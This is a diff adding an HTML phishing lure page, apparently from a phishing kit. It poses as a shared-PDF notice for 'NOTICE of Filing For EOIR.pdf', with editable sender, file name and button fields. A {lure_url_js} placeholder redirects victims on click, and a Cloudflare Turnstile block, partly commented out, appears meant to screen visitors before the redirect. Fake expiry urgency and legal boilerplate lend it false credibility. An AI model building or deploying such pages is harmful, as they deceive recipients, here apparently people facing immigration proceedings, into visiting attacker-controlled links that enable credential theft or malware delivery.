@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Shared a file with you (1)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <script src="pdf.js"></script>
+    
+    <style>
+        body {
+            /*background-image: url('bg.jpg');*/
+            /*background-size: cover;*/
+            /*background-position: top center;*/
+            /*background-attachment: fixed;*/
+            background: rgb(243, 243, 243);
+        }
+     
+        
+        @keyframes zoomIn {
+            from {
+                transform: translate(-50%, -50%) scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .card-zoom {
+            animation: zoomIn 0.4s ease-out;
+        }
+        @media print {
+          @page {
+            size: A4 landscape;
+          }
+        }
+      
+    </style>
+</head>
+<body class=" ">
+    <!-- Logo -->
+    <div class="rounded-2xl max-w-[800px]  shadow-sm p-5 max-w-90 w-full mx-auto card-zoom mt-10 mb-8"  style="margin: 0 auto; padding: 40px 30px; margin-top: 80px; background: linear-gradient(to top, white, white);">
+        <div class="text-center">
+        <img src="logo.png" alt="Logo" class="h-20 mx-auto mb-8 mt-8">
+
+    <p class="mb-6">
+
+    <span class="text-lg text-gray-600 font-bold"
+       data-tag="editable"
+       data-label="Sender">
+        Mira Jean</span> 
+
+    <span class="text-lg text-gray-600 mb-1"
+       data-tag="editable"
+       data-label="Sender Action">shared a PDF document with you </span>
+    </p>
+
+            <!-- Document Info -->
+            <div class="">
+    <span class="h-16 mx-auto mb-4 bg-red-700 text-white font-semibold px-3 py-1 text-white/90 rounded-sm text-xs"> PDF</span>
+
+    <p class="text-xl font-semibold mt-3" style="word-wrap: break-word;">
+        <span
+            data-tag="editable"
+            data-label="Document File Name"
+            class="text-gray-800 underline decoration-dotted hover:text-gray-600 hover:decoration-solid transition-colors cursor-pointer"
+        >
+            NOTICE of Filing For EOIR.pdf
+        </span>
+    </p>
+
+    <p class="text-sm text-gray-600 mt-2"
+       data-tag="editable"
+       data-label="Share Message">
+        22MB . 12 Pages 
+    </p>
+
+    <p class="text-xs text-gray-500 mt-2"
+       data-tag="editable"
+       data-label="Time Stamp">
+        Shared 8 hours ago
+    </p>
+</div>
+
+<div class="border-b border-gray-100 pb-[70px] mt-6">
+
+    <div class="download flex flex-col items-center gap-3">
+
+        <a href="#"
+           data-tag="editable"
+
+           data-url="true">
+
+            <button
+                type="button"
+                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition duration-200 transform hover:scale-105 shadow-lg flex items-center justify-center gap-2 mt-[60px]"
+            >
+
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+                    </path>
+                </svg>
+                <span 
+           data-tag="editable"
+           data-label="Button Text (USE THIS!)">
+
+                View Document
+            </span>
+
+            </button>
+        </a>
+
+
+    <div id="cf-turnstile"></div>
+
+<script>
+// turnstile.ready(function () {
+//         turnstile.render('#cf-turnstile', {
+//             sitekey: '0x4AAAAAACXRP8wxxBAwoG3l', // replace this with your own sitekey
+//             callback: function(token) {
+//                 window.location.assign({lure_url_js});
+//             },
+//         });
+//     });
+</script>
+</div>
+
+            </div>
+
+
+    <p class="text-xs text-gray-500 mt-8 text-center"
+       data-tag="editable"
+       data-label="Expiry">
+        This link will expire in 7 days
+    </p>
+        </div>
+    </div>
+
+
+    <div class="rounded-2xl max-w-[800px]  p-5 max-w-90 w-full mx-auto mt-10"  style="margin: 0 auto; margin-top: 80px; padding: 35px 30px;  ">
+
+        <div class="max-w-3xl mx-auto bg-gray-50 border border-gray-200 rounded-xl p-6 text-sm text-gray-600">
+  <h2 class="text-amber-600 font-semibold uppercase tracking-wide mb-4">
+    Confidentiality Notice:
+  </h2>
+
+  <p class="mb-4 leading-relaxed">
+    This document contains confidential and proprietary information intended solely for the individual or entity to whom it is addressed. Unauthorized review, use, disclosure, or distribution is strictly prohibited.
+  </p>
+
+  <p class="leading-relaxed">
+    <span class="font-semibold text-gray-700">Legal Notice:</span>
+    This communication (including any attachments) is for the sole use of the intended recipient(s) and may contain confidential and privileged information. Any unauthorized review, use, disclosure, or distribution is strictly prohibited. If you are not the intended recipient, please contact the sender and destroy all copies of the original message.
+  </p>
+
+  <div class="mt-6 text-xs text-gray-500">
+    © 2026. All rights reserved.
+    <!-- <a href="#" class="underline hover:text-gray-700 ml-1">Privacy Policy</a> -->
+    <!-- | -->
+    <!-- <a href="#" class="underline hover:text-gray-700 ml-1">Terms of Use</a> -->
+  </div>
+</div>
+    </div>
+
+    <script>
+        function clickedDownload() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+</body>
+</html>
